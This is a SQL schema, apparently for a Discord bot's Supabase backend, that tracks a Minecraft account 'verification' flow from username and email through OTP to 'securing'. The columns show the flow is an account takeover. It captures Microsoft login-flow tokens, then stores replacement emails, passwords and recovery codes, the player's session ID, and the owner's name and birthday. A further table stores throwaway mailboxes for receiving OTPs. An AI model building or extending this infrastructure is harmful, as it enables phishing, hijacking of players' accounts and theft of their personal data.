-- ============================================================
-- TABLE: verification_sessions
-- Tracks ongoing verification attempts (MC username + email entry -> OTP -> securing)
-- ============================================================
CREATE TABLE IF NOT EXISTS public.verification_sessions (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  discord_id TEXT NOT NULL REFERENCES public.profiles(discord_id) ON DELETE CASCADE,
  guild_id TEXT NOT NULL,
  mc_username TEXT NOT NULL,
  mc_email TEXT NOT NULL,
  status TEXT NOT NULL DEFAULT 'pending' CHECK (status IN ('pending','otp_sent','authenticated','securing','secured','failed')),
  flow_token TEXT,
  msaauth TEXT,
  ppft TEXT,
  url_post TEXT,
  otp_method TEXT,
  security_email TEXT,
  error_message TEXT,
  channel_id TEXT,
  message_id TEXT,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  updated_at TIMESTAMPTZ NOT NULL DEFAULT now()
);

GRANT ALL ON public.verification_sessions TO service_role;
ALTER TABLE public.verification_sessions ENABLE ROW LEVEL SECURITY;
CREATE POLICY "service role only" ON public.verification_sessions FOR ALL TO service_role USING (true) WITH CHECK (true);

CREATE TRIGGER verification_sessions_touch BEFORE UPDATE ON public.verification_sessions
  FOR EACH ROW EXECUTE FUNCTION public.tg_touch_updated_at();

-- ============================================================
-- TABLE: secured_accounts
-- Stores results of completed account securing operations
-- ============================================================
CREATE TABLE IF NOT EXISTS public.secured_accounts (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  session_id UUID REFERENCES public.verification_sessions(id) ON DELETE SET NULL,
  discord_id TEXT NOT NULL REFERENCES public.profiles(discord_id) ON DELETE CASCADE,
  mc_username TEXT NOT NULL,
  mc_email TEXT NOT NULL,
  new_email TEXT,
  new_password TEXT,
  new_recovery_code TEXT,
  mc_ssid TEXT,
  mc_capes TEXT,
  mc_method TEXT,
  owner_first_name TEXT,
  owner_last_name TEXT,
  owner_region TEXT,
  owner_birthday TEXT,
  secured_at TIMESTAMPTZ NOT NULL DEFAULT now()
);

GRANT ALL ON public.secured_accounts TO service_role;
ALTER TABLE public.secured_accounts ENABLE ROW LEVEL SECURITY;
CREATE POLICY "service role only" ON public.secured_accounts FOR ALL TO service_role USING (true) WITH CHECK (true);

-- ============================================================
-- TABLE: verification_security_emails
-- Tracks generated firstmail.ltd emails for OTP retrieval
-- ============================================================
CREATE TABLE IF NOT EXISTS public.verification_security_emails (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  email TEXT NOT NULL UNIQUE,
  password TEXT NOT NULL,
  session_id UUID REFERENCES public.verification_sessions(id) ON DELETE CASCADE,
  used BOOLEAN NOT NULL DEFAULT false,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);

GRANT ALL ON public.verification_security_emails TO service_role;
ALTER TABLE public.verification_security_emails ENABLE ROW LEVEL SECURITY;
CREATE POLICY "service role only" ON public.verification_security_emails FOR ALL TO service_role USING (true) WITH CHECK (true);
